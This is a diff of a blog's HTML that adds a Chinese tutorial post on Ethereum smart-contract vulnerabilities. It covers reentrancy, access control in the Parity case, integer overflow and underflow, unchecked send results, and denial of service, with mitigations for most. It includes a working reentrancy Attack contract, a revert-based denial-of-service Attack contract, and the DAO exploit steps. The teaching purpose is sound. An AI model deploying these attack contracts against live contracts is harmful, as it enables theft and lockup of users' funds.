@@ -140,7 +140,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Ethereum/" style="font-size: 15px;">Ethereum</a> <a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/resume/" style="font-size: 10px;">resume</a> <a href="/tags/京剧/" style="font-size: 17.5px;">京剧</a> <a href="/tags/其它/" style="font-size: 10px;">其它</a> <a href="/tags/定场诗/" style="font-size: 10px;">定场诗</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/面试体验/" style="font-size: 10px;">面试体验</a> <a href="/tags/马甲包/" style="font-size: 12.5px;">马甲包</a>
+                        <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Ethereum/" style="font-size: 15px;">Ethereum</a> <a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/resume/" style="font-size: 10px;">resume</a> <a href="/tags/京剧/" style="font-size: 17.5px;">京剧</a> <a href="/tags/其它/" style="font-size: 10px;">其它</a> <a href="/tags/定场诗/" style="font-size: 10px;">定场诗</a> <a href="/tags/算法/" style="font-size: 10px;">算法</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/面试体验/" style="font-size: 10px;">面试体验</a> <a href="/tags/马甲包/" style="font-size: 12.5px;">马甲包</a>
                     </div>
                 </section>
                 
@@ -213,6 +213,262 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-Ethereum-bug" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/18/Ethereum-bug/" class="article-date">
+      <time datetime="2019-03-18T11:17:29.000Z" itemprop="datePublished">2019-03-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/18/Ethereum-bug/">以太坊漏洞 TOP9</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="top-1-Reentrancy"><a href="#top-1-Reentrancy" class="headerlink" title="top 1 Reentrancy"></a>top 1 Reentrancy</h1><h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><p><strong>重置资产放在转币操作后</strong></p>
+<p>The DAO对此体会深刻。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><h4 id="fallback"><a href="#fallback" class="headerlink" title="fallback"></a>fallback</h4><p>fallback函数，回退函数，是合约里的特殊无名函数，有且仅有一个。它在合约调用没有匹配到函数签名，或者调用没有带任何数据时被自动调用。</p>
+<h4 id="转币"><a href="#转币" class="headerlink" title="转币"></a>转币</h4><blockquote>
+<ol>
+<li><address>.transfer()    //失败抛出throw且回滚，2300gas</address></li>
+<li><address>.send()    //失败返回false，2300gas</address></li>
+<li><address>.gas().call.value()()    //失败返回false，所有gas</address></li>
+</ol>
+</blockquote>
+<h3 id="重置资产放在转币操作后"><a href="#重置资产放在转币操作后" class="headerlink" title="重置资产放在转币操作后"></a>重置资产放在转币操作后</h3><p>所以就可以进行下面的操作了。</p>
+<h4 id="attack-steps"><a href="#attack-steps" class="headerlink" title="attack steps:"></a>attack steps:</h4><blockquote>
+<p>1.Propose a split and wait until the voting period expires. (DAO.sol, createProposal)</p>
+</blockquote>
+<blockquote>
+<p>2.Execute the split. (DAO.sol, splitDAO)</p>
+</blockquote>
+<blockquote>
+<p>3.Let the DAO send your new DAO its share of tokens. (splitDAO -&gt; TokenCreation.sol, createTokenProxy)</p>
+</blockquote>
+<blockquote>
+<p>4.Make sure the DAO tries to send you a reward before it updates your balance but after doing (3). (splitDAO -&gt; withdrawRewardFor -&gt; ManagedAccount.sol, payOut)</p>
+</blockquote>
+<blockquote>
+<p>5.While the DAO is doing (4), have it run splitDAO again with the same parameters as in (2) (payOut -&gt; _recipient.call.value -&gt; _recipient())</p>
+</blockquote>
+<blockquote>
+<p>6.The DAO will now send you more child tokens, and go to withdraw your reward before updating your balance. (DAO.sol, splitDAO)</p>
+</blockquote>
+<blockquote>
+<p>7.Back to (5)!</p>
+</blockquote>
+<blockquote>
+<p>8.Let the DAO update your balance. Because (7) goes back to (5), it never actually will :-).</p>
+</blockquote>
+<p>其中最关键的就是第4步，payOut使用_recipient.call.value(_amount)()转币，而splitDAO函数中资产重置是放在withdrawRewardFor转币函数后，造成漏洞。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract vulnerable_DAO&#123;</span><br><span class="line">    mapping(address=&gt;uint) userBalances;</span><br><span class="line">    <span class="function">function <span class="title">vulnerable_DAO</span><span class="params">()</span> payable </span>&#123;&#125;</span><br><span class="line">    <span class="function">function <span class="title">getUserBalance</span><span class="params">(address user)</span> constant <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userBalances[user];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">addToBalance</span><span class="params">()</span> payable </span>&#123;</span><br><span class="line">        userBalances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">withdrawBalance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        uint amountToWithdraw = userBalances[msg.sender];</span><br><span class="line">        <span class="keyword">if</span>(msg.sender.call.value(amountToWithdraw)() ==<span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        userBalances[msg.sender] = <span class="number">0</span>;  <span class="comment">//这里先throw，再归零</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">getBalance</span><span class="params">()</span> <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address vulnerable_contract;</span><br><span class="line">    uint attackCount;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    <span class="function">function <span class="title">Attack</span><span class="params">()</span> <span class="keyword">public</span></span>&#123;</span><br><span class="line">        attackCount = <span class="number">2</span>;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function() payable&#123;    <span class="comment">//在这里，可以肆意操作一波</span></span><br><span class="line">        <span class="keyword">while</span>(attackCount&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            attackCount--;</span><br><span class="line">            require(vulnerable_contract.call(bytes4(keccak256(<span class="string">"withdrawBalance()"</span>))));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">deposit</span><span class="params">(address _vulnerable_contract)</span> <span class="keyword">public</span> payable</span>&#123;</span><br><span class="line">        vulnerable_contract = _vulnerable_contract;</span><br><span class="line">        require(vulnerable_contract.call.value(msg.value)(bytes4(keccak256(<span class="string">"addToBalance()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">withdraw</span><span class="params">()</span></span>&#123;</span><br><span class="line">        require(vulnerable_contract.call(bytes4(keccak256(<span class="string">"withdrawBalance()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">getBalance</span><span class="params">()</span> <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="避坑方法"><a href="#避坑方法" class="headerlink" title="避坑方法"></a>避坑方法</h2><p>很多方法都可以帮助避免智能合约中潜在的重新入口漏洞。</p>
+<p>第一种方法是，当发送以太币到外部合约时，使用内置的transfer()函数。Transfer()函数只发送2300个gas，这不足以使目的地址/合约调用另一个合约（例如，重新进入发送中的合约）。</p>
+<p>第二个方法是，在以太币被从合约（或任何外部调用）发送出去之前，确保所有改变状态变量的逻辑发生。将执行外部调用的任何代码作为本地化函数或代码执行的最后一个操作，并将执行外部调用的代码置于未知地址上。这就是所谓的「检查-效应-交互」模式。</p>
+<p>第三个方法是，引入一个互斥系统。也就是说，添加一个状态变量，该状态变量在代码执行期间锁定合约，从而防止重新入口的调用。</p>
+<hr>
+<h1 id="top-2-Access-Control"><a href="#top-2-Access-Control" class="headerlink" title="top 2 Access Control"></a>top 2 Access Control</h1><h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>攻击者通过合约不安全的可见性设置时可以直接访问合约的私有变量和函数，这其中需要可能需要绕过一些访问控制。</p>
+<h2 id="background-1"><a href="#background-1" class="headerlink" title="background"></a>background</h2><h3 id="0x01-函数访问域关键字"><a href="#0x01-函数访问域关键字" class="headerlink" title="0x01 函数访问域关键字"></a>0x01 函数访问域关键字</h3><p>在使用Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：private, public, external 和 internal，对合约实例方法来讲，默认可见状态为 public，而合约实例变量的默认可见状态为private，external函数为合约接口，只能被其他合约调用（在自身需通过this.f()调用），internal函数只能被自身调用。</p>
+<h3 id="0x02-tx-origin"><a href="#0x02-tx-origin" class="headerlink" title="0x02 tx.origin"></a>0x02 tx.origin</h3><p>tx.origin不安全。（现在被禁用了）<br>tx.origin返回地址是源调用地址，而msg.sender返回地址是直接调用地址。</p>
+<h3 id="0x03-delegatecall"><a href="#0x03-delegatecall" class="headerlink" title="0x03 delegatecall"></a>0x03 delegatecall</h3><p>delegatecall的滥用。<br>delegatecall调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。<br>call外部调用后上下文是自身。</p>
+<p>像这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract A &#123;</span><br><span class="line">    <span class="function">event <span class="title">callMeMaybeEvent</span><span class="params">(address _from)</span></span>;</span><br><span class="line">    <span class="function">function <span class="title">callMeMaybe</span><span class="params">()</span> payable <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        callMeMaybeEvent(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    <span class="function">function <span class="title">callTheOtherContract</span><span class="params">(address _contractAddress)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        require(_contractAddress.call(bytes4(keccak256(<span class="string">"callMeMaybe()"</span>))));</span><br><span class="line">        require(_contractAddress.delegatecall(bytes4(keccak256(<span class="string">"callMeMaybe()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library SomeLib &#123;</span><br><span class="line">    <span class="function">event <span class="title">calledSomeLib</span><span class="params">(address _from)</span></span>;</span><br><span class="line">    <span class="function">function <span class="title">calledSomeLibFun</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        calledSomeLib(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="实例-Parity"><a href="#实例-Parity" class="headerlink" title="实例 Parity"></a>实例 Parity</h2><p>Parity就被这么搞过。</p>
+<p>黑客通过 delegatecall 调用 initWallet 函数， initWallet 没有检查以防止攻击者在合同初始化后调用到 initMultiowned ，漏洞使得黑客能通过 library 库函数，让自己成为多个 Parity 钱包的新主人，然后调用转账函数把钱转走。</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>1.initWallet 函数可以改变合约的 owner 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function initWallet(address[] _owners, uint _required, uint _daylimit) &#123;</span><br><span class="line">  initDaylimit(_daylimit);</span><br><span class="line">  initMultiowned(_owners, _required);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>2.代码里使用了 delegatecall() 函数，导致所有 public 函数对所有人可见。包括 initWallet 函数。而且 initWallet 函数也没有作任何防护措施。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function() payable &#123;</span><br><span class="line">  <span class="comment">// just being sent some cash?</span></span><br><span class="line">  <span class="keyword">if</span> (msg.value &gt; <span class="number">0</span>)</span><br><span class="line">    Deposit(msg.sender, msg.value);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (msg.data.length &gt; <span class="number">0</span>)</span><br><span class="line">    _walletLibrary.delegatecall(msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>3.攻击者先获取owner权限，将调用函数的指令放在Data中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function: initWallet(address[] _owners, uint256 _required, uint256 _daylimit) ***</span><br></pre></td></tr></table></figure>
+<p>4.然后执行execute获取所有 funds</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function: execute(address _to, uint256 _value, bytes _data) ***</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="top-3-Arithmetic-Issues"><a href="#top-3-Arithmetic-Issues" class="headerlink" title="top 3 Arithmetic Issues"></a>top 3 Arithmetic Issues</h1><h2 id="0x00-info"><a href="#0x00-info" class="headerlink" title="0x00 info"></a>0x00 info</h2><p>Arithmetic Issues为DASP TOP10的第三类漏洞。这类漏洞比较常见。</p>
+<blockquote>
+<p>also known as integer overflow and integer underflow</p>
+</blockquote>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>传统而经典的整形溢出问题。<br>比如说uint8:</p>
+<blockquote>
+<p>(uint) 0 - 1 = 255</p>
+</blockquote>
+<h2 id="0x02-场景"><a href="#0x02-场景" class="headerlink" title="0x02 场景"></a>0x02 场景</h2><p>1.没有检查下溢<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint _amount) &#123;</span><br><span class="line">    require(balances[msg.sender] - _amount &gt; 0); // 如果 _amount &gt; msg.sender, underflow </span><br><span class="line">    msg.sender.transfer(_amount);  // 会transfer一个很大的值</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>2.off-by-one<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function popArrayOfThings() &#123;</span><br><span class="line">    require(arrayOfThings.length &gt;= 0);</span><br><span class="line">    arrayOfThings.length--;  // length是uint，当length=0，length--会下溢翻转；同样++也需要注意</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03上溢漏洞"><a href="#0x03上溢漏洞" class="headerlink" title="0x03上溢漏洞"></a>0x03上溢漏洞</h2><p>可发生在转账金额很大、余额不足时，判断条件里出现上溢，造成转账成功</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//上溢</span></span><br><span class="line"><span class="function">function <span class="title">_transfer</span><span class="params">(address _from, address _to, uint _value)</span> internal </span>&#123;</span><br><span class="line">    <span class="comment">/* Check if the sender has enough value */</span></span><br><span class="line">    require (balanceOf[_from] &gt;= _value + burnPerTransaction); <span class="comment">// boom!</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-下溢漏洞"><a href="#0x04-下溢漏洞" class="headerlink" title="0x04 下溢漏洞"></a>0x04 下溢漏洞</h2><p>下溢漏洞首先要理解solidity中状态变量的存储模型。</p>
+<blockquote>
+<p>合约的存储有一个指针，合约的变量都存储在以这个指针为基址的偏移地址中。</p>
+</blockquote>
+<blockquote>
+<p>大小固定的变量存储在一个槽中。</p>
+</blockquote>
+<blockquote>
+<p>大小不定的变量，如mapping和不定长数组:</p>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>mapping的定义位置占一个槽，但其中无数据，数据存储位置由keccak(k,p)计算。</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>不定长数组定义的位置占一个槽，其中存储数组长度，数据存储位置由keccak(k,p)计算。</p>
+</blockquote>
+</blockquote>
+<p>理解了上述存储模型，当数组长度发生下溢时，数组长度变得很大，造成溢出，即可通过keccak(k,p)计算并修改任何位置的数据。这有点像二进制中的栈溢出和任意内存读写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address public owner;</span><br><span class="line">address public trustedThirdParty;</span><br><span class="line">mapping (address =&gt; uint) public balanceOf;</span><br><span class="line">uint public deposited;</span><br><span class="line">uint public withdrawLimit;</span><br><span class="line">uint[] public bonusCodes;</span><br></pre></td></tr></table></figure>
+<p>此时storage中的情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;storage&quot;:&#123;</span><br><span class="line">    0x00 : (address)owner,</span><br><span class="line">    0x01 : (address)trustedThirdParty,</span><br><span class="line">    0x02 : (mapping)balanceOf,</span><br><span class="line">    0x03 : (uint)deposited,</span><br><span class="line">    0x04 : (uint)withdrawLimit,</span><br><span class="line">    0x05 : (uint[])bonusCodes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>下面当bonusCodes.length = 0, 通过bonusCodes.length–，bonusCodes.length = (很大)， 几乎覆盖了所有storage，其它变量也被覆盖到了数组中，故找到变量实际位置对应数组下标，就可以通过修改数组从而修改该变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function popBonusCode() onlyOwner &#123;</span><br><span class="line">    require(bonusCodes.length &gt;= 0);</span><br><span class="line">    bonusCodes.length--;   // boom!</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="避坑方法-1"><a href="#避坑方法-1" class="headerlink" title="避坑方法"></a>避坑方法</h2><p>防止溢出/下溢漏洞的常规方法是，使用或构建数学库来替代标准的数学运算符，包括加法、减法和乘法（没有除法，因为它不会导致溢出/下溢）。</p>
+<p>OppenZepplin在构建和审核安全库方面做了大量的工作，以太坊社区可以充分利用这些库。</p>
+<hr>
+<p>#top 4 Unchecked Return Values</p>
+<h2 id="Info-1"><a href="#Info-1" class="headerlink" title="Info"></a>Info</h2><p>字面意思是没有检查一些不安全调用函数的返回值。<br>我理解是因为调用了一些不安全函数，由于没有检查返回值，造成运行时错误，但行为不可逆，代码继续执行，造成不可预料的恶果。</p>
+<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><h3 id="background-2"><a href="#background-2" class="headerlink" title="background"></a>background</h3><p>先来看一个这几个函数</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>特性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>address.transfer()</td>
+<td>1. 失败抛出异常且回滚 2. 提供2300gas，防止reentrancy</td>
+</tr>
+<tr>
+<td>address.send()</td>
+<td>1. 失败返回false 2. 提供2300gass，防止reentrancy</td>
+</tr>
+<tr>
+<td>address.call.value().gas()()</td>
+<td>1. 失败返回false 2. 发送所有可用gas</td>
+</tr>
+</tbody>
+</table>
+<p>1.address.transfer()和address.send()可以防止重入漏洞，然而这样花2300gas就能做一些操作。<br>2.address.call.value().gas()()不能防止Reentrancy。</p>
+<p>gas溢出和超过调用栈限制这两点导致的发送失败很容易被忽略。solidity特性中存在一些不安全的函数call(),callcode()(已经遗弃),delegatecall()和send()。</p>
+<blockquote>
+<p><strong>这个函数在运行错误时行为并不可逆，仅会返回false，代码流程也会继续，这就会带来很多不可预期的结果。</strong></p>
+</blockquote>
+<h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msg.sender为一个智能合约，其中未定义fallback函数，或者callstack已满，均会导致send失败，而函数未检出send返回值，最终导致msg.sender和etherLeft数量减少且状态不可逆转，最后却没有取回减少的钱。</span></span><br><span class="line"><span class="function">function <span class="title">withdraw</span><span class="params">(uint256 _amount)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">    etherLeft -= _amount;</span><br><span class="line">    msg.sender.send(_amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>msg.sender为一个智能合约，其中未定义fallback函数，或者callstack已满，均会导致send失败，而函数未检出send返回值，因为<strong>这个函数在运行错误时行为并不可逆，仅会返回false，代码流程也会继续，这就会带来很多不可预期的结果</strong>，最终导致msg.sender和etherLeft数量减少且状态不可逆转，最后却没有取回减少的钱。</p>
+<h2 id="避坑技巧"><a href="#避坑技巧" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>在可能的情况下，如果外部交易复原，则使用transfer()函数而不是send()函数作为复原的方式。如果需要send()，需要始终确保对返回值的检查。</p>
+<p>当然，更好的方式是采用withdrawal模式，这个模式中每个用户都需要调用一个独立的函数（例如 withdraw函数）来处理从合约中发送以太币的问题，因此独立处理发送交易失败的结果。</p>
+<p>这个想法是从逻辑上将外部发送函数从代码基础的其余部分分离出来，并将可能失败交易的负担放到了调用withdraw函数的最终用户身上。</p>
+<hr>
+<h1 id="top-5-Denial-of-Services"><a href="#top-5-Denial-of-Services" class="headerlink" title="top 5 Denial of Services"></a>top 5 Denial of Services</h1><h2 id="Info-2"><a href="#Info-2" class="headerlink" title="Info"></a>Info</h2><p>在智能合约中，当 超过gas限制，异常抛出，非预期的终止合约，访问控制被破坏 均会产生合约拒绝服务问题。</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="GovernMental"><a href="#GovernMental" class="headerlink" title="GovernMental"></a>GovernMental</h3><p>规则大概为投资者捐最少1ETH给政府，如果政府在最近12小时内没有收到任何捐赠，则将奖金发给最后一名投资人，而如果收到奖励，则按一定比例分别将钱分给资金池、政府及投资人。<br>其中在大于12小时未收到赞助的逻辑分支中，将奖金分给最后一名投资人后会重置所有投资人：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if (lastTimeOfNewCredit + TWELVE_HOURS &lt; block.timestamp) &#123;</span><br><span class="line">    // Return money to sender</span><br><span class="line">    msg.sender.send(amount);</span><br><span class="line">    // Sends all contract money to the last creditor</span><br><span class="line">    creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash);</span><br><span class="line">    corruptElite.send(this.balance);</span><br><span class="line">    // Reset contract state</span><br><span class="line">    lastCreditorPayedOut = 0;</span><br><span class="line">    lastTimeOfNewCredit = block.timestamp;</span><br><span class="line">    profitFromCrash = 0;</span><br><span class="line">    creditorAddresses = new address[](0);    // out of gas!!</span><br><span class="line">    creditorAmounts = new uint[](0);         // out of gas!!</span><br><span class="line">    round += 1;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果creditors过多的话，会消耗大于当前最大gas数量导致合约失效。</p>
+<h3 id="King-of-the-Ether"><a href="#King-of-the-Ether" class="headerlink" title="King of the Ether"></a>King of the Ether</h3><p>模仿King of the Ether游戏规则，当你向合约发送比现在price多的eth时，你就可以成为总统，之前的总统会收到当前price的补偿，且当前price翻倍。<br>而争夺者为一个合约且在fallback函数中恶意抛出异常，则可以破坏游戏规则永远成为总统。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract PresidentOfCountry &#123;</span><br><span class="line">    address <span class="keyword">public</span> president;</span><br><span class="line">    uint256 <span class="keyword">public</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">PresidentOfCountry</span><span class="params">(uint256 _price)</span> </span>&#123;</span><br><span class="line">        require(_price &gt; <span class="number">0</span>);</span><br><span class="line">        price = _price;</span><br><span class="line">        president = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">becomePresident</span><span class="params">()</span> payable </span>&#123;</span><br><span class="line">        require(msg.value &gt; price); <span class="comment">// must pay the price to become president</span></span><br><span class="line">        president.transfer(price);   <span class="comment">// we pay the previous president</span></span><br><span class="line">        president = msg.sender;      <span class="comment">// we crown the new president</span></span><br><span class="line">        price = price * <span class="number">2</span>;           <span class="comment">// we double the price to become president</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function () &#123; revert(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">Attack</span><span class="params">(address _target)</span> payable </span>&#123;</span><br><span class="line">        _target.call.value(msg.value)(bytes4(keccak256(<span class="string">"becomePresident()"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Attack合约部署后通过构造函数调用PresidentOfCountry合约的becomePresident()函数，同时发送大于price的eth，则执行becomePresident逻辑，1. 向之前的账户发送price补偿；2. 自己合约账户变为president；3. price翻倍。</p>
